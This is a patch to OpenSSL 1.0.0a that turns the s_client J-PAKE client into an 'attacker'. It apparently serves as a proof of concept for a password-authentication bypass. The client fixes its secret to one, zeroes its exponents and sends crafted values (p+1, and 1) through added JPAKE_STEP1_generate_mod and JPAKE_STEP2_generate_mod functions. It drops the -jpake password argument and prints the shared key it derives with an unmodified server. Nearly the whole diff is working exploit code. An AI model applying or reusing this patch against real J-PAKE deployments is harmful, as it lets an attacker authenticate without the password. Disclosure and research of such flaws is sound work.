--- openssl-1.0.0a.orig/apps/apps.c	2010-05-27 16:09:13.000000000 +0200
+++ openssl-1.0.0a.orig/apps/apps.c	2010-12-02 10:45:52.000000000 +0100
@@ -2465,7 +2465,7 @@ void policies_print(BIO *out, X509_STORE
 #if !defined(OPENSSL_NO_JPAKE) && !defined(OPENSSL_NO_PSK)
 
 static JPAKE_CTX *jpake_init(const char *us, const char *them,
-							 const char *secret)
+                             const char *secret, int attacker)
 	{
 	BIGNUM *p = NULL;
 	BIGNUM *g = NULL;
@@ -2480,6 +2480,9 @@ static JPAKE_CTX *jpake_init(const char 
 	q = BN_new();
 	BN_rshift1(q, p);
 
+        if (attacker)
+          BN_one(bnsecret);
+        else
 	BN_bin2bn((const unsigned char *)secret, strlen(secret), bnsecret);
 
 	ctx = JPAKE_CTX_new(us, them, p, g, q, bnsecret);
@@ -2501,11 +2504,14 @@ static void jpake_send_part(BIO *conn, c
 	BIO_puts(conn, "\n");
 	}
 
-static void jpake_send_step1(BIO *bconn, JPAKE_CTX *ctx)
+static void jpake_send_step1(BIO *bconn, JPAKE_CTX *ctx, int attacker)
 	{
 	JPAKE_STEP1 s1;
 
 	JPAKE_STEP1_init(&s1);
+        if (attacker)
+          JPAKE_STEP1_generate_mod(&s1, ctx);
+        else
 	JPAKE_STEP1_generate(&s1, ctx);
 	jpake_send_part(bconn, &s1.p1);
 	jpake_send_part(bconn, &s1.p2);
@@ -2513,11 +2519,14 @@ static void jpake_send_step1(BIO *bconn,
 	JPAKE_STEP1_release(&s1);
 	}
 
-static void jpake_send_step2(BIO *bconn, JPAKE_CTX *ctx)
+static void jpake_send_step2(BIO *bconn, JPAKE_CTX *ctx, int attacker)
 	{
 	JPAKE_STEP2 s2;
 
 	JPAKE_STEP2_init(&s2);
+        if (attacker)
+          JPAKE_STEP2_generate_mod(&s2, ctx);
+        else
 	JPAKE_STEP2_generate(&s2, ctx);
 	jpake_send_part(bconn, &s2);
 	(void)BIO_flush(bconn);
@@ -2633,14 +2642,15 @@ void jpake_client_auth(BIO *out, BIO *co
 
 	BIO_puts(out, "Authenticating with JPAKE\n");
 
-	ctx = jpake_init("client", "server", secret);
+        // (seb) The client is the "attacker", thus the last argument 1.
+	ctx = jpake_init("client", "server", secret, 1);
 
 	bconn = BIO_new(BIO_f_buffer());
 	BIO_push(bconn, conn);
 
-	jpake_send_step1(bconn, ctx);
+	jpake_send_step1(bconn, ctx, 1);
 	jpake_receive_step1(ctx, bconn);
-	jpake_send_step2(bconn, ctx);
+	jpake_send_step2(bconn, ctx, 1);
 	jpake_receive_step2(ctx, bconn);
 	jpake_send_step3a(bconn, ctx);
 	jpake_receive_step3b(ctx, bconn);
@@ -2649,6 +2659,11 @@ void jpake_client_auth(BIO *out, BIO *co
 
 	psk_key = BN_bn2hex(JPAKE_get_shared_key(ctx));
 
+        // (seb) Just to print the shared key.
+        BIO_puts(out, "PSK key: ");
+        BIO_puts(out, psk_key);
+        BIO_puts(out, "\n");
+
 	BIO_pop(bconn);
 	BIO_free(bconn);
 
@@ -2662,15 +2677,17 @@ void jpake_server_auth(BIO *out, BIO *co
 
 	BIO_puts(out, "Authenticating with JPAKE\n");
 
-	ctx = jpake_init("server", "client", secret);
+        // (seb) The server is an unmodified openssl jpake server, thus the
+        // last argument 0.
+	ctx = jpake_init("server", "client", secret, 0);
 
 	bconn = BIO_new(BIO_f_buffer());
 	BIO_push(bconn, conn);
 
 	jpake_receive_step1(ctx, bconn);
-	jpake_send_step1(bconn, ctx);
+	jpake_send_step1(bconn, ctx, 0);
 	jpake_receive_step2(ctx, bconn);
-	jpake_send_step2(bconn, ctx);
+	jpake_send_step2(bconn, ctx, 0);
 	jpake_receive_step3a(ctx, bconn);
 	jpake_send_step3b(bconn, ctx);
 
@@ -2678,6 +2695,11 @@ void jpake_server_auth(BIO *out, BIO *co
 
 	psk_key = BN_bn2hex(JPAKE_get_shared_key(ctx));
 
+        // (seb) Just to print the shared key.
+        BIO_puts(out, "PSK key: ");
+        BIO_puts(out, psk_key);
+        BIO_puts(out, "\n");
+
 	BIO_pop(bconn);
 	BIO_free(bconn);
 
--- openssl-1.0.0a.orig/apps/s_client.c	2009-12-16 21:28:28.000000000 +0100
+++ openssl-1.0.0a.orig/apps/s_client.c	2010-12-02 10:45:52.000000000 +0100
@@ -719,8 +719,8 @@ int MAIN(int argc, char **argv)
 #ifndef OPENSSL_NO_JPAKE
 		else if (strcmp(*argv,"-jpake") == 0)
 			{
-			if (--argc < 1) goto bad;
-			jpake_secret = *++argv;
+                          //if (--argc < 1) goto bad;
+			jpake_secret = "";//*++argv;
 			}
 #endif
 		else
--- openssl-1.0.0a.orig/crypto/jpake/jpake.c	2008-11-02 16:41:30.000000000 +0100
+++ openssl-1.0.0a.orig/crypto/jpake/jpake.c	2010-12-02 10:45:52.000000000 +0100
@@ -480,3 +480,42 @@ const BIGNUM *JPAKE_get_shared_key(JPAKE
     return ctx->key;
     }
 
+
+// (seb) Modified functions used by the attacker.
+
+static void generate_step_part_mod_step1(JPAKE_STEP_PART *p, const BIGNUM *x,
+                                         const BIGNUM *g, JPAKE_CTX *ctx) {
+  BN_add(p->gx, ctx->p.p, BN_value_one());
+  generate_zkp(p, x, g, ctx);
+}
+
+int JPAKE_STEP1_generate_mod(JPAKE_STEP1 *send, JPAKE_CTX *ctx) {
+  BN_zero(ctx->xa);
+  BN_zero(ctx->xb);
+  generate_step_part(&send->p1, ctx->xa, ctx->p.g, ctx);
+  generate_step_part_mod_step1(&send->p2, ctx->xb, ctx->p.g, ctx);
+
+  return 1;
+}
+
+static void generate_step_part_mod_step2(JPAKE_STEP_PART *p, const BIGNUM *g,
+                                         JPAKE_CTX *ctx) {
+  BIGNUM *x = BN_new();
+
+  BN_zero(x);
+  BN_one(p->gx);
+  generate_zkp(p, x, g, ctx);
+
+  BN_free(x);
+}
+
+int JPAKE_STEP2_generate_mod(JPAKE_STEP2 *send, JPAKE_CTX *ctx) {
+  BIGNUM *g = BN_new();
+
+  BN_mod_mul(g, ctx->p.gxc, ctx->p.gxd, ctx->p.p, ctx->ctx);
+  generate_step_part_mod_step2(send, g, ctx);
+
+  BN_free(g);
+
+  return 1;
+}